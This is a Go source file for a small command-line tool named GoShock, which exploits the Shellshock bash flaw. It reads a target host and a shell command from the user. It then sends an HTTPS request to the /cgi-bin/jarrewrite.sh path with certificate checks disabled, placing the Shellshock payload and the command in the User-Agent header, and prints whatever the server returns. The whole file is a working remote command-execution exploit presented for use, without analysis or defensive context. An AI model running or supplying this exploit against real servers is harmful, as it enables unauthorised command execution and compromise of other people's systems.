package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"

	"github.com/gookit/color"
)

func showBanner() {

	banner := `  
	 _                   
	|_) \/ |   _. |_   _ 
	|   /\ |_ (_| |_) _>
	
	  GoShock v.0.0.1
`

	fmt.Println(banner)

}

func main() {
	// clear screen
	fmt.Print("\033[H\033[2J")

	showBanner()

	var TARGET string
	var CMD string
	var ARG string

	color.Bold.Print("TARGET> ")
	fmt.Scan(&TARGET)

	color.Bold.Print("Linux Shell Command> ")
	fmt.Scan(&CMD)
	fmt.Scanln(&ARG)

	COMMAND := fmt.Sprintf("%s %s", CMD, ARG)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	req, err := http.NewRequest("GET", "https://"+TARGET+"/cgi-bin/jarrewrite.sh", nil)
	if err != nil {

	}
	req.Host = TARGET
	req.Header.Set("User-Agent", "() { :; }; echo ; /bin/bash -c '"+COMMAND+"'")
	req.Header.Set("Connection", "close")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en")
	req.Header.Set("Accept-Encoding", "gzip, deflate")

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Printf("%s\n", body)
}
